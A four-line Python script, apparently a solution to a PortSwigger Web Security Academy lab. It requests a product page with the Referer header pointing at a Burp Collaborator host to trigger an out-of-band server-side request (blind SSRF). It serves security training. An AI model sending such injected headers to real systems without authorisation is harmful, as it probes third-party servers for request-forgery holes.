import requests
s = requests.Session()
url = 'https://ac961f331effe7ab80295e8300eb002f.web-security-academy.net/product?productId=1'
s.get(url, headers={'referer' : "https://burpcollaborator.net"})